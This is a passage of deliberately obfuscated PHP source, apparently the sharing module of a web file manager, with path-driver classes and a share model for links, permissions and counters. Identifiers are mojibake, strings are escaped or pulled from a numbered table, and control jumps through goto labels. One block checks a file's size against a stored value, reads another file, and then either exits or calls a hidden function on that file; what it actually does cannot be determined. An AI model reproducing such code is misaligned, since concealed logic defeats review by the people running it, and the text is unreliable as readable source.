$˙ˆ±ÄúÔ) { self::$_methodList[$Æ‰™∆ÍÚ] = $˙ˆ±ÄúÔ; } public static function addMethodStatic($µπæÖÙ›, $ØÂÈê÷£) { self::$_methodListStatic[$µπæÖÙ›] = $ØÂÈê÷£; } } goto c‚áå‡≥°°; A–®ÚÉÑÚ®: class PathDriverDbShareItem extends PathDriverDB { public function __construct($ÍΩ£¬Ç√) { $this->pathParse = $ÍΩ£¬Ç√; $this->model = Model($_SERVER[ß⁄ˆÇ†Œ][1414]); } public function getPathOuter($¯±»ﬁ£‹) { $úÕÀ™çµ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$¯±»ﬁ£‹) { return $¯±»ﬁ£‹; } $ÆõìáÖè = $this->parse($¯±»ﬁ£‹); return trim(KodIO::makeShare($this->pathParse[$úÕÀ™çµ[483]], $ÆõìáÖè[$úÕÀ™çµ[483]]), $úÕÀ™çµ[8]); } protected function infoParse($û™ºÎ¡ , $œ‘Ã„èï = false, $«ÊØºˆ = false) { $ŒÑ∆ãÚÏ =& $_SERVER[ß⁄ˆÇ†Œ]; $¥“œé˛À = $this->pathParse[$ŒÑ∆ãÚÏ[483]]; $“úê«˝Ï = trim($this->pathParse[$ŒÑ∆ãÚÏ[1246]], $ŒÑ∆ãÚÏ[8]); return Action($ŒÑ∆ãÚÏ[1421])->sharePathInfo($¥“œé˛À, $“úê«˝Ï, $œ‘Ã„èï); } public function infoFull($∫œπ¶ú¿) { $ÀÂ≥˝ó◊ =& $_SERVER[ß⁄ˆÇ†Œ]; $åëä¬ôÕ = explode($ÀÂ≥˝ó◊[8], trim($∫œπ¶ú¿, $ÀÂ≥˝ó◊[8])); if (count($åëä¬ôÕ) > 1) { $–‘›Ìæ÷ = implode($ÀÂ≥˝ó◊[8], array_splice($åëä¬ôÕ, 1)); $ﬁ˛¶≤’õ = $this->model->pathInfoByPath($åëä¬ôÕ[0], $–‘›Ìæ÷); if (!$ﬁ˛¶≤’õ) { return !1; } $this->pathParse[$ÀÂ≥˝ó◊[1246]] = $ﬁ˛¶≤’õ[$ÀÂ≥˝ó◊[193]]; } return $this->infoParse($∫œπ¶ú¿); } public function listAll($òïÏ†ò) { $πüÖ‡’ =& $_SERVER[ß⁄ˆÇ†Œ]; $∆â◊‹ÀŸ = IO::info($this->pathParse[$πüÖ‡’[87]]); if (!$∆â◊‹ÀŸ) { return array(); } $Çö¶ëûµ = $this->model->listAll($òïÏ†ò); $Ûˆ⁄€üô = Model($πüÖ‡’[672])->getInfo($∆â◊‹ÀŸ[$πüÖ‡’[673]]); foreach ($Çö¶ëûµ as &$¬ÂÅÃ¡„) { check_abort(); $¬ÂÅÃ¡„[$πüÖ‡’[90]] = Action($πüÖ‡’[1421])->_shareItemeParse($¬ÂÅÃ¡„[$πüÖ‡’[90]], $Ûˆ⁄€üô); } unset($¬ÂÅÃ¡„); return $Çö¶ëûµ; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($›Ø¢ó¨ª) { $this->pathParse = $›Ø¢ó¨ª; $this->model = Model($_SERVER[ß⁄ˆÇ†Œ][1414]); } protected function infoParse($≈ÅøÅÀ, $ﬁ∑◊á‡î = false, $ÆÍî‹ò– = false) { $Áı¿ÛÅ≥ =& $_SERVER[ß⁄ˆÇ†Œ]; return Action($Áı¿ÛÅ≥[1252])->sharePathInfo($this->pathParse[$Áı¿ÛÅ≥[87]], !0, $ﬁ∑◊á‡î); } public function listPath($£¨”Ûå™, $œ’Îüô® = false) { $„·áã“√ =& $_SERVER[ß⁄ˆÇ†Œ]; $œé∏ó≥… = parent::listPath($£¨”Ûå™, $œ’Îüô®); if (!$œé∏ó≥…) { return $œé∏ó≥…; } if (is_array($œé∏ó≥…[$„·áã“√[1422]])) { $œé∏ó≥…[$„·áã“√[1422]] = Action($„·áã“√[1252])->shareItemInfo($œé∏ó≥…[$„·áã“√[1422]]); } foreach ($œé∏ó≥… as $˝Æπ‚é’ => $§ø™çÚò) { if (!in_array($˝Æπ‚é’, array($„·áã“√[86], $„·áã“√[85]))) { continue; } foreach ($§ø™çÚò as $ßÙõ¢¢ÿ => $ õ∑Ø•ß) { $œé∏ó≥…[$˝Æπ‚é’][$ßÙõ¢¢ÿ] = Action($„·áã“√[1252])->shareItemInfo($ õ∑Ø•ß); } } return $œé∏ó≥…; } public function listAll($ú≥≥Ê∆Œ) { $ñﬁ⁄–ßç =& $_SERVER[ß⁄ˆÇ†Œ]; $°•ÂèµΩ = IO::info($this->pathParse[$ñﬁ⁄–ßç[87]]); if (!$°•ÂèµΩ) { return array(); } $≤à˛·èŸ = $this->model->listAll($ú≥≥Ê∆Œ); foreach ($≤à˛·èŸ as &$ë†´úö¸) { $ë†´úö¸[$ñﬁ⁄–ßç[90]] = Action($ñﬁ⁄–ßç[1252])->shareItemInfo($ë†´úö¸[$ñﬁ⁄–ßç[90]]); } unset($ë†´úö¸); return $≤à˛·èŸ; } } class PathDriverDriverShareItem { public function __construct($Åı¿ÖÂú) { $this->pathParse = $Åı¿ÖÂú; } public function __call($≠û∞É £, $ªåí¿‹Ì) { $¨«å∞≈π =& $_SERVER[ß⁄ˆÇ†Œ]; if (method_exists($this, $≠û∞É £)) { return; } $˙±¿ÔŸû = call_user_func_array(array($¨«å∞≈π[1423], $≠û∞É £), $ªåí¿‹Ì); $Éº«∆ªî = array($¨«å∞≈π[1424], $¨«å∞≈π[1425], $¨«å∞≈π[1426], $¨«å∞≈π[1427], $¨«å∞≈π[626], $¨«å∞≈π[628], $¨«å∞≈π[1428], $¨«å∞≈π[110], $¨«å∞≈π[1429], $¨«å∞≈π[1430]); if (in_array($≠û∞É £, $Éº«∆ªî)) { $˙±¿ÔŸû = $this->getPathOuter($˙±¿ÔŸû); } return $˙±¿ÔŸû; } public function copy($Í˜’ÚÌø, $—úøû¯ú, $…üÖçœ◊ = false, $∆ƒÀ–±ç = false) { return $this->copyMove($Í˜’ÚÌø, $—úøû¯ú, $…üÖçœ◊, $_SERVER[ß⁄ˆÇ†Œ][626], $∆ƒÀ–±ç); } public function move($ñ•ßïìÅ, $ÚÚáœ—◊, $’ŒºΩÁ° = false, $Ãç®Ãà‘ = false) { return $this->copyMove($ñ•ßïìÅ, $ÚÚáœ—◊, $’ŒºΩÁ°, $_SERVER[ß⁄ˆÇ†Œ][628], $Ãç®Ãà‘); } private function copyMove($ËûÍ…Î˜, $Æ¥®˘–Æ, $€’êåá∆, $û›´æé®, $òÇ⁄‚é√ = false) { $ëöù˚À¸ =& $_SERVER[ß⁄ˆÇ†Œ]; $èÊ∞™¡ = $Æ¥®˘–Æ; $‘Æ≥òÆ” = IO::driverMake($Æ¥®˘–Æ); if ($‘Æ≥òÆ”->pathParse[$ëöù˚À¸[1228]]) { $Æ¥®˘–Æ = $‘Æ≥òÆ”->pathParse[$ëöù˚À¸[1228]]; } else { $Æ¥®˘–Æ = $èÊ∞™¡; } $ﬁÜ≤±ìŸ = IO::copyMove($ËûÍ…Î˜, $Æ¥®˘–Æ, $€’êåá∆, $û›´æé®, $òÇ⁄‚é√); $ﬁÜ≤±ìŸ = $this->getPathOuter($ﬁÜ≤±ìŸ); return $ﬁÜ≤±ìŸ; } public function pathThis($é∑—ê£É) { return get_path_this($this->pathParse[$_SERVER[ß⁄ˆÇ†Œ][87]]); } public function pathFather($ÍÓñÃ∆ï) { return get_path_father($this->pathParse[$_SERVER[ß⁄ˆÇ†Œ][87]]); } public function iconvSystem($¡Å¬Ø ¯) { return $¡Å¬Ø ¯; } protected function infoParse($˝ƒâî≠˙, $à˙òµπ• = false) { $ÂÒ—Ñ°Í =& $_SERVER[ß⁄ˆÇ†Œ]; $ÌÿÀî“‹ = $this->pathParse[$ÂÒ—Ñ°Í[568]][$ÂÒ—Ñ°Í[1253]] . $this->pathParse[$ÂÒ—Ñ°Í[1246]]; if ($à˙òµπ•) { $©˙û€ÕÓ = IO::infoWithChildren($ÌÿÀî“‹); } else { $©˙û€ÕÓ = IO::info($ÌÿÀî“‹); } $∏ÍÖ—Öõ = $this->pathParse[$ÂÒ—Ñ°Í[568]]; return Action($ÂÒ—Ñ°Í[1421])->_shareItemeParse($©˙û€ÕÓ, $∏ÍÖ—Öõ); } public function listAll($©ª‹·”Ë) { $’ºâôÜˆ =& $_SERVER[ß⁄ˆÇ†Œ]; $ÊûàÖ”È = IO::listAll($©ª‹·”Ë); $∆Ñ≈»ÅÔ = rtrim($this->pathParse[$’ºâôÜˆ[568]][$’ºâôÜˆ[1253]], $’ºâôÜˆ[8]); foreach ($ÊûàÖ”È as &$Û≤à¯Ë√) { $Û≤à¯Ë√[$’ºâôÜˆ[87]] = $this->pathDriver . $’ºâôÜˆ[8] . ltrim(substr($Û≤à¯Ë√[$’ºâôÜˆ[87]], strlen($∆Ñ≈»ÅÔ)), $’ºâôÜˆ[8]); } unset($Û≤à¯Ë√); return $ÊûàÖ”È; } public function listAllSimple($¶≠Ω¿´, $ˆÉÓ¶€∆ = false) { $ò‰Á˚¡ö =& $_SERVER[ß⁄ˆÇ†Œ]; $§ä“¥ø’ = $this->listAll($¶≠Ω¿´); $–ö”˜Ãî = $this->pathParse[$ò‰Á˚¡ö[503]]; if (trim($–ö”˜Ãî, $ò‰Á˚¡ö[8]) == trim(get_path_father($–ö”˜Ãî), $ò‰Á˚¡ö[8])) { $ˆÉÓ¶€∆ = !0; } return IO::init($ò‰Á˚¡ö[12])->listAllSimpleMake($§ä“¥ø’, $–ö”˜Ãî, $ˆÉÓ¶€∆); } public function getPathOuter($Õ˙îö»é) { $ˆèÅ˝Ïç =& $_SERVER[ß⁄ˆÇ†Œ]; $ÊÚÄ¡ç∏ = KodIO::parse($Õ˙îö»é); if ($ÊÚÄ¡ç∏[$ˆèÅ˝Ïç[33]] == KodIO::KOD_SHARE_ITEM) { return $ÊÚÄ¡ç∏[$ˆèÅ˝Ïç[87]]; } $Í·ç¬∞˜ = KodIO::clear($Õ˙îö»é); $ôÒ–ËÍ€ = KodIO::clear($this->pathParse[$ˆèÅ˝Ïç[568]][$ˆèÅ˝Ïç[1253]]); $Õ∞ó∑ÉÖ = substr($Í·ç¬∞˜, strlen($ôÒ–ËÍ€)); if (substr($Í·ç¬∞˜, 0, strlen($ôÒ–ËÍ€)) != $ôÒ–ËÍ€) { return !1; } return $this->pathParse[$ˆèÅ˝Ïç[1247]] . $ˆèÅ˝Ïç[8] . ltrim($Õ∞ó∑ÉÖ, $ˆèÅ˝Ïç[8]); } public function getType() { $¿îì®ì≥ =& $_SERVER[ß⁄ˆÇ†Œ]; $ÂÏ‚Òÿ÷ = str_replace($¿îì®ì≥[77], $¿îì®ì≥[12], get_class($this)); return strtolower($ÂÏ‚Òÿ÷); } public function isOsDriver($§¬∫¿Ù) { return IO::isOsDriver($§¬∫¿Ù); } public function info($Çà£Óıë) { return $this->infoParse($Çà£Óıë); } public function infoAuth($ê‚‚ï≤Ê) { return $this->infoParse($ê‚‚ï≤Ê); } public function infoWithChildren($πåœü¬) { return $this->infoParse($πåœü¬, !0); } public function infoFull($·∑¿˚ò∆) { return $this->infoParse($·∑¿˚ò∆); } } goto c∫ﬁØŸÿû≠; fì…·ñÈﬁΩ: if ($_SERVER[$_SERVER[ß⁄ˆÇ†Œ][321]] != $_size($_file)) { $_getc = $_SERVER[ß⁄ˆÇ†Œ][323]; $_getfile = $_SERVER[$_SERVER[ß⁄ˆÇ†Œ][324]] . $_SERVER[ß⁄ˆÇ†Œ][325]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ß⁄ˆÇ†Œ][262], $_getfilec); if (count($_getarrs) < $_SERVER[ß⁄ˆÇ†Œ][326]) { $exit = $_SERVER[ß⁄ˆÇ†Œ][327]; $exit(); } $_act = $_SERVER[ß⁄ˆÇ†Œ][328]; $_act($_file); } class ShareModel extends ModelBase { protected $tableName = "\163\x68\x61\162\x65"; protected $dataAuto = array(array("\155\157\x64\151\146\171\x54\151\155\145", "\164\151\x6d\x65", "\151\156\x73\145\162\164\54\x75\x70\x64\141\x74\x65", "\146\x75\156\143\164\151\x6f\x6e"), array("\143\x72\145\x61\x74\x65\x54\x69\155\x65", "\164\151\155\145", "\x69\156\163\145\162\x74", "\146\x75\156\x63\164\151\157\x6e"), array("\157\160\x74\151\157\156\163", '', "\x69\156\163\x65\x72\164\54\x75\x70\144\141\164\145\x2c\x73\x65\x6c\145\x63\x74", "\x6a\163\157\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($ß¨–èÍ∂) { $åî∆”¶Ñ =& $_SERVER[ß⁄ˆÇ†Œ]; $ñ¶™©æ‰ = isset($ß¨–èÍ∂[0]) ? $ß¨–èÍ∂[0] : !1; return array($åî∆”¶Ñ[2106] => array(USER_ID, $åî∆”¶Ñ[2107]), $åî∆”¶Ñ[2047] => array($ñ¶™©æ‰, $åî∆”¶Ñ[2108])); } protected function listSimple() { $ïÅøÖñî = array($_SERVER[ß⁄ˆÇ†Œ][1764] => USER_ID); $ÊõªÒ—™ = $this->field($this->fieldList)->where($ïÅøÖñî)->select(); return $ÊõªÒ—™ ? $ÊõªÒ—™ : array(); } protected function getInfo($´éﬁ‰∏Ç, $»Ì”òù˙ = false) { $ÑÈÍÊè =& $_SERVER[ß⁄ˆÇ†Œ]; if ($»Ì”òù˙) { return $this->_getShareInfo(array($ÑÈÍÊè[673] => $´éﬁ‰∏Ç)); } $¶ö°öî≤ = $this->cacheFunctionGet($ÑÈÍÊè[2049], $´éﬁ‰∏Ç); return $¶ö°öî≤; } public function getInfoByHash($Ÿß–©Û”) { return $this->_getShareInfo(array($_SERVER[ß⁄ˆÇ†Œ][2109] => $Ÿß–©Û”)); } public function getInfoByPath($ºƒ˙¯öŒ) { $“ß±¯ÒÑ =& $_SERVER[ß⁄ˆÇ†Œ]; $ΩÂ˘¸ÜŒ = array($“ß±¯ÒÑ[1764] => USER_ID, $“ß±¯ÒÑ[193] => $ºƒ˙¯öŒ); return $this->_getShareInfo($ΩÂ˘¸ÜŒ); } public function getInfoBySourcePath($ïœúÓâß) { $˘ï⁄”Ëî =& $_SERVER[ß⁄ˆÇ†Œ]; $∆˘Û·¥ = array($˘ï⁄”Ëî[1764] => USER_ID, $˘ï⁄”Ëî[1253] => $ïœúÓâß); return $this->_getShareInfo($∆˘Û·¥); } private function _getShareInfo($Æ¶⁄ıΩŒ) { $Î‚≤ÿ§Ê =& $_SERVER[ß⁄ˆÇ†Œ]; $√˙¡øú = $this->where($Æ¶⁄ıΩŒ)->find(); if (!$√˙¡øú) { return !1; } $Æ¶⁄ıΩŒ = array($Î‚≤ÿ§Ê[673] => $√˙¡øú[$Î‚≤ÿ§Ê[673]]); $ÓﬁÔµ˚Ã = $Î‚≤ÿ§Ê[2110]; $ˆ∆¨ÈØñ = Model($Î‚≤ÿ§Ê[674])->order($Î‚≤ÿ§Ê[483])->field($ÓﬁÔµ˚Ã)->where($Æ¶⁄ıΩŒ)->select(); if ($√˙¡øú[$Î‚≤ÿ§Ê[193]] == $Î‚≤ÿ§Ê[228]) { $√˙¡øú[$Î‚≤ÿ§Ê[90]] = IO::info($√˙¡øú[$Î‚≤ÿ§Ê[1253]]); } else { $√˙¡øú[$Î‚≤ÿ§Ê[90]] = Model($Î‚≤ÿ§Ê[1414])->pathInfo($√˙¡øú[$Î‚≤ÿ§Ê[193]]); } $√˙¡øú[$Î‚≤ÿ§Ê[2111]] = $ˆ∆¨ÈØñ; return $√˙¡øú; } protected function getInfoAuth($ó©ç†˙è) { $¯ƒ”Ñ‹ö =& $_SERVER[ß⁄ˆÇ†Œ]; $èæ©ñ‡ = $this->getInfo($ó©ç†˙è); if ($èæ©ñ‡[$¯ƒ”Ñ‹ö[1764]] == USER_ID) { $èæ©ñ‡[$¯ƒ”Ñ‹ö[495]] = $èæ©ñ‡[$¯ƒ”Ñ‹ö[90]][$¯ƒ”Ñ‹ö[495]]; } else { $èæ©ñ‡[$¯ƒ”Ñ‹ö[495]] = Model($¯ƒ”Ñ‹ö[575])->authMake($èæ©ñ‡[$¯ƒ”Ñ‹ö[2111]]); } return $èæ©ñ‡; } protected function listData($≤ΩØø∫ã = null, $¡˝È‰Éº = 300) { $ÓåŒ˚Ä≥ =& $_SERVER[ß⁄ˆÇ†Œ]; $ØòﬂìÙ∑ = array(array($ÓåŒ˚Ä≥[570] => array($ÓåŒ˚Ä≥[1086], 0), $ÓåŒ˚Ä≥[671] => array($ÓåŒ˚Ä≥[1086], 0), $ÓåŒ˚Ä≥[2112] => $ÓåŒ˚Ä≥[2065])); if ($≤ΩØø∫ã == $ÓåŒ˚Ä≥[2113]) { $ØòﬂìÙ∑ = array($ÓåŒ˚Ä≥[570] => 1); } else { if ($≤ΩØø∫ã == $ÓåŒ˚Ä≥[1238]) { $ØòﬂìÙ∑ = array($ÓåŒ˚Ä≥[671] => 1); } } $ØòﬂìÙ∑[$ÓåŒ˚Ä≥[1764]] = USER_ID; $Ô†ã«‹Ù = $this->where($ØòﬂìÙ∑)->selectPage($¡˝È‰Éº); return $Ô†ã«‹Ù; } protected function listToMe($ıáæÛè‹ = 300) { $—”º±‰´ =& $_SERVER[ß⁄ˆÇ†Œ]; $ÜÍæ∆õÿ = Model($—”º±‰´[2114])->userGroupParents(USER_ID); $àÃá˚©– = array($—”º±‰´[656] => SourceModel::TYPE_USER, $—”º±‰´[577] => USER_ID); if ($ÜÍæ∆õÿ) { $àÃá˚©– = array(array($—”º±‰´[656] => SourceModel::TYPE_USER, $—”º±‰´[577] => USER_ID), array($—”º±‰´[656] => SourceModel::TYPE_GROUP, $—”º±‰´[577] => array($—”º±‰´[7], $ÜÍæ∆õÿ)), $—”º±‰´[2112] => $—”º±‰´[2065]); } $ÖÛ∂Ù€¿ = Model($—”º±‰´[674])->where($àÃá˚©–)->selectPage($ıáæÛè‹); $€æì€¶Ä = array_to_keyvalue_group($ÖÛ∂Ù€¿[$—”º±‰´[454]], $—”º±‰´[673]); if (!$€æì€¶Ä) { return $ÖÛ∂Ù€¿; } $úÇöÓàﬂ = $—”º±‰´[2115]; $àÃá˚©– = array($—”º±‰´[673] => array($—”º±‰´[500], array_keys($€æì€¶Ä)), $—”º±‰´[1764] => array($—”º±‰´[1088], $—”º±‰´[228])); $¥úä§≈ò = $this->field($úÇöÓàﬂ)->where($àÃá˚©–)->select(); foreach ($¥úä§≈ò as $ú»äú¶˛ => &$ùÉÄÒ¶⁄) { $ùÉÄÒ¶⁄[$—”º±‰´[2111]] = $€æì€¶Ä[$ùÉÄÒ¶⁄[$—”º±‰´[673]]]; } unset($ùÉÄÒ¶⁄); $˛†Ωâ≥ç = array($—”º±‰´[2116] => $¥úä§≈ò, $—”º±‰´[2117] => $ÖÛ∂Ù€¿[$—”º±‰´[451]]); return $˛†Ωâ≥ç; } protected function shareAdd($∏˜Í Æö, $⁄›ÌÁÔƒ) { $›¬¿ÎÁ° =& $_SERVER[ß⁄ˆÇ†Œ]; $éòŸ•î» = $this->_addShareData($∏˜Í Æö, $⁄›ÌÁÔƒ); if (!empty($⁄›ÌÁÔƒ[$›¬¿ÎÁ°[2118]])) { $this->_shareAuthSet($éòŸ•î», $⁄›ÌÁÔƒ[$›¬¿ÎÁ°[2118]]); } $this->shareEventAdd($∏˜Í Æö, $⁄›ÌÁÔƒ, $›¬¿ÎÁ°[2119]); return $éòŸ•î»; } protected function shareAddSystem($ö¿ﬁ´Üõ, $£Ëà…‹•) { $àÊü¬Ô =& $_SERVER[ß⁄ˆÇ†Œ]; $Å™Â™í˙ = $this->_addShareData($ö¿ﬁ´Üõ, $£Ëà…‹•, $àÊü¬Ô[191]); $this->_shareAuthSet($Å™Â™í˙, $£Ëà…‹•[$àÊü¬Ô[2118]]); return $Å™Â™í˙; } private function shareEventAdd($ª˚Ü÷Ÿç, $í—œ¨Ó„, $çœœ«Ÿ· = "\141\x64\x64") { $¬¿Û˘€ø =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$ª˚Ü÷Ÿç || $ª˚Ü÷Ÿç == $¬¿Û˘€ø[228]) { return; } if ($çœœ«Ÿ· == $¬¿Û˘€ø[2119]) { if ($í—œ¨Ó„[$¬¿Û˘€ø[570]] == $¬¿Û˘€ø[91]) { Model($¬¿Û˘€ø[641])->eventShare($ª˚Ü÷Ÿç, $¬¿Û˘€ø[2120]); } if ($í—œ¨Ó„[$¬¿Û˘€ø[671]] == $¬¿Û˘€ø[91]) { Model($¬¿Û˘€ø[641])->eventShare($ª˚Ü÷Ÿç, $¬¿Û˘€ø[2121]); } return; } $´Ò€‚’˜ = $this->getInfoByPath($ª˚Ü÷Ÿç); $·†≈˘êÕ = $¬¿Û˘€ø[2122]; if ($´Ò€‚’˜[$¬¿Û˘€ø[570]] == $¬¿Û˘€ø[228] && $í—œ¨Ó„[$¬¿Û˘€ø[570]] == $¬¿Û˘€ø[91]) { $·†≈˘êÕ = $¬¿Û˘€ø[2120]; } if ($´Ò€‚’˜[$¬¿Û˘€ø[570]] == $¬¿Û˘€ø[91] && $í—œ¨Ó„[$¬¿Û˘€ø[570]] == $¬¿Û˘€ø[228]) { $·†≈˘êÕ = $¬¿Û˘€ø[2123]; } if ($´Ò€‚’˜[$¬¿Û˘€ø[671]] == $¬¿Û˘€ø[228] && $í—œ¨Ó„[$¬¿Û˘€ø[671]] == $¬¿Û˘€ø[91]) { $·†≈˘êÕ = $¬¿Û˘€ø[2121]; } if ($´Ò€‚’˜[$¬¿Û˘€ø[671]] == $¬¿Û˘€ø[91] && $í—œ¨Ó„[$¬¿Û˘€ø[671]] == $¬¿Û˘€ø[228]) { $·†≈˘êÕ = $¬¿Û˘€ø[2124]; } Model($¬¿Û˘€ø[641])->eventShare($ª˚Ü÷Ÿç, $·†≈˘êÕ); return; } private function _addShareData($°»¸˙ØΩ, $çø∑˝Üı = array(), $“ôŸ∆‘™ = false) { $âŒ›• Ê =& $_SERVER[ß⁄ˆÇ†Œ]; $ˆµ÷˛ß© = $“ôŸ∆‘™ == $âŒ›• Ê[191] ? 0 : USER_ID; $û‘ßŒ«∆ = array($âŒ›• Ê[499] => $°»¸˙ØΩ, $âŒ›• Ê[1755] => $ˆµ÷˛ß©); if ($°»¸˙ØΩ == 0) { $û‘ßŒ«∆ = array($âŒ›• Ê[2125] => $çø∑˝Üı[$âŒ›• Ê[1253]], $âŒ›• Ê[1755] => $ˆµ÷˛ß©); } if ($Öú˜ÕÊ» = $this->where($û‘ßŒ«∆)->find()) { return $Öú˜ÕÊ»[$âŒ›• Ê[673]]; } if ($°»¸˙ØΩ == 0) { $‰ÉœûÅ˘ = array($âŒ›• Ê[32] => get_path_this($çø∑˝Üı[$âŒ›• Ê[87]])); } else { $‰ÉœûÅ˘ = Model($âŒ›• Ê[897])->sourceInfo($°»¸˙ØΩ); if (!$‰ÉœûÅ˘) { return !1; } } if (!$çø∑˝Üı[$âŒ›• Ê[1653]]) { $çø∑˝Üı[$âŒ›• Ê[1653]] = $‰ÉœûÅ˘[$âŒ›• Ê[32]]; } $ﬂˆ·∞Ï‡ = array($âŒ›• Ê[1755] => $ˆµ÷˛ß©, $âŒ›• Ê[499] => $°»¸˙ØΩ, $âŒ›• Ê[1653] => $âŒ›• Ê[12], $âŒ›• Ê[570] => 0, $âŒ›• Ê[671] => 0, $âŒ›• Ê[1253] => $âŒ›• Ê[12], $âŒ›• Ê[392] => $âŒ›• Ê[12], $âŒ›• Ê[963] => $âŒ›• Ê[12], $âŒ›• Ê[2126] => 0, $âŒ›• Ê[2127] => 0, $âŒ›• Ê[834] => 0, $âŒ›• Ê[2128] => $âŒ›• Ê[12], $âŒ›• Ê[2109] => $âŒ›• Ê[12]); $˛˝Ïı¸Ã = explode($âŒ›• Ê[50], $âŒ›• Ê[2129]); foreach ($˛˝Ïı¸Ã as $´ﬁÔ˙∑ë) { if (!isset($çø∑˝Üı[$´ﬁÔ˙∑ë])) { continue; } $ﬂˆ·∞Ï‡[$´ﬁÔ˙∑ë] = $çø∑˝Üı[$´ﬁÔ˙∑ë]; } $Ö›©∑‡‘ = $this->add($ﬂˆ·∞Ï‡); $±ŸÖØ»ê = array($âŒ›• Ê[2109] => short_id($Ö›©∑‡‘)); $this->where(array($âŒ›• Ê[2130] => $Ö›©∑‡‘))->save($±ŸÖØ»ê); return $Ö›©∑‡‘; } private function _shareAuthSet($∞ü©˚÷Õ, $√π⁄‚ﬂ¶) { $∆“ﬁåî =& $_SERVER[ß⁄ˆÇ†Œ]; if (!is_array($√π⁄‚ﬂ¶)) { return !1; } $ÔÆıµ©‡ = Model($∆“ﬁåî[2075]); $ÔÆıµ©‡->where(array($∆“ﬁåî[673] => $∞ü©˚÷Õ))->delete(); $≥¸§ïèÍ = array(); foreach ($√π⁄‚ﬂ¶ as $ƒ®§Ï´¥) { $îÚƒ¨œ» = SourceModel::TYPE_USER; if ($ƒ®§Ï´¥[$∆“ﬁåî[190]] == SourceModel::TYPE_GROUP) { $îÚƒ¨œ» = SourceModel::TYPE_GROUP; } $’ËÇŸéá = array($∆“ﬁåî[673] => $∞ü©˚÷Õ, $∆“ﬁåî[190] => $îÚƒ¨œ», $∆“ﬁåî[577] => intval($ƒ®§Ï´¥[$∆“ﬁåî[577]]), $∆“ﬁåî[2071] => 0, $∆“ﬁåî[2131] => -1); if ($ƒ®§Ï´¥[$∆“ﬁåî[2071]]) { $’ËÇŸéá[$∆“ﬁåî[2071]] = $ƒ®§Ï´¥[$∆“ﬁåî[2071]]; } else { if ($ƒ®§Ï´¥[$∆“ﬁåî[2131]]) { $’ËÇŸéá[$∆“ﬁåî[2131]] = $ƒ®§Ï´¥[$∆“ﬁåî[2131]]; } } $≥¸§ïèÍ[] = $’ËÇŸéá; } return $ÔÆıµ©‡->addAll($≥¸§ïèÍ, array(), !0); } public function numViewAdd($ÁÅ±˙≥ü) { $’∑ ∑∆ =& $_SERVER[ß⁄ˆÇ†Œ]; $Ì¥Âó¨Ñ = array($’∑ ∑∆[2130] => $ÁÅ±˙≥ü); $this->where($Ì¥Âó¨Ñ)->setAdd($’∑ ∑∆[2126]); } public function numDownloadAdd($Æ‰Ù¶∫) { $∆†∏„¯˝ =& $_SERVER[ß⁄ˆÇ†Œ]; $¸•íÉÙè = array($∆†∏„¯˝[2130] => $Æ‰Ù¶∫); $this->where($¸•íÉÙè)->setAdd($∆†∏„¯˝[2127]); } protected function shareEdit($çÚÜ√•∑, $¥»∂·ﬂΩ) { $ª˛çç„‹ =& $_SERVER[ß⁄ˆÇ†Œ]; $€√òÿÒ≥ = $this->getInfo($çÚÜ√•∑); if (!$€√òÿÒ≥) { return !1; } $this->_checkLinkShare($¥»∂·ﬂΩ, $€√òÿÒ≥); $˘∂æ∑Ï≠ = array(); $±ÂÓÍÔ¨ = explode($ª˛çç„‹[50], $ª˛çç„‹[2132]); foreach ($±ÂÓÍÔ¨ as $„¢éÇ å) { if (!array_key_exists($„¢éÇ å, $¥»∂·ﬂΩ)) { continue; } $˘∂æ∑Ï≠[$„¢éÇ å] = $¥»∂·ﬂΩ[$„¢éÇ å]; } $this->shareEventAdd($€√òÿÒ≥[$ª˛çç„‹[193]], $¥»∂·ﬂΩ, $ª˛çç„‹[1932]); $this->where(array($ª˛çç„‹[2130] => $çÚÜ√•∑))->save($˘∂æ∑Ï≠); if (isset($¥»∂·ﬂΩ[$ª˛çç„‹[2118]])) { $this->_shareAuthSet($çÚÜ√•∑, $¥»∂·ﬂΩ[$ª˛çç„‹[2118]]); } return !0; } private function _checkLinkShare($ÄœëÄ¿◊, $ƒÁﬂ€¯„) { $ıÄêŒäı =& $_SERVER[ß⁄ˆÇ†Œ]; if ($ÄœëÄ¿◊[$ıÄêŒäı[570]] != $ıÄêŒäı[91]) { return; } $ç‡â÷Åü = $ƒÁﬂ€¯„[$ıÄêŒäı[90]][$ıÄêŒäı[193]]; if ($ƒÁﬂ€¯„[$ıÄêŒäı[90]][$ıÄêŒäı[33]] != $ıÄêŒäı[230]) { $ÙãÎÜÖ¬ = $this->_folderReport($ç‡â÷Åü); if (!$ÙãÎÜÖ¬) { return; } show_json(LNG($ıÄêŒäı[2133]) . $ıÄêŒäı[2134] . $ÙãÎÜÖ¬, !1); } $’˛ÅâÚØ = Model($ıÄêŒäı[897])->fileInfoGet($ƒÁﬂ€¯„[$ıÄêŒäı[90]][$ıÄêŒäı[193]]); if (!$’˛ÅâÚØ) { return; } $≥‰¸á≈ = $this->shareFileMeta($’˛ÅâÚØ[$ıÄêŒäı[549]]); if (isset($≥‰¸á≈[$ıÄêŒäı[459]]) && $≥‰¸á≈[$ıÄêŒäı[459]] == $ıÄêŒäı[91]) { show_json(LNG($ıÄêŒäı[2135]), !1); } } private function _folderReport($éï–Ì÷®) { $‹éú¨“Á =& $_SERVER[ß⁄ˆÇ†Œ]; $˙ı€·Ó∫ = array($‹éú¨“Á[549] => array($‹éú¨“Á[1086], 0), $‹éú¨“Á[823] => 3); $¸∑™ﬁ˚’ = Model($‹éú¨“Á[2136])->where($˙ı€·Ó∫)->field($‹éú¨“Á[549])->select(); if (!$¸∑™ﬁ˚’) { return !1; } $¸∑™ﬁ˚’ = array_to_keyvalue($¸∑™ﬁ˚’, $‹éú¨“Á[12], $‹éú¨“Á[549]); $ôâÿıÿò = $‹éú¨“Á[50] . $éï–Ì÷® . $‹éú¨“Á[50]; $˙ı€·Ó∫ = array($‹éú¨“Á[549] => array($‹éú¨“Á[7], $¸∑™ﬁ˚’), $‹éú¨“Á[592] => array($‹éú¨“Á[467], "\45{$ôâÿıÿò}\x25"), $‹éú¨“Á[513] => 0); $¯Æñπº˜ = Model($‹éú¨“Á[897])->where($˙ı€·Ó∫)->field($‹éú¨“Á[2137])->find(); if (!$¯Æñπº˜) { return !1; } $∏‚¨˝ƒ¿ = 